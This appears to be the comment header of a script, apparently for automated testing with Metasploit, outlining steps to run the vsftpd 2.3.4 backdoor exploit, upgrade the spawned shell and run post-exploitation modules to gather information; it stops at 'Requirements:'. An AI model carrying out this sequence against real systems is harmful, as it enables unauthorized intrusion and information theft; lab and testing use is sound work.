#     1. Execute exploit/unix/ftp/vsftpd_234_backdoor
#     2. Run command using the spawned session
#     3. Set variable UPGRADESESSION to the session-name
#     4. Perform commands to make the shell more interactive
#     5. Run commands on the upgraded shell
#     6. Execute multiple post-exploitation-modules to gather info
#
# Requirements:
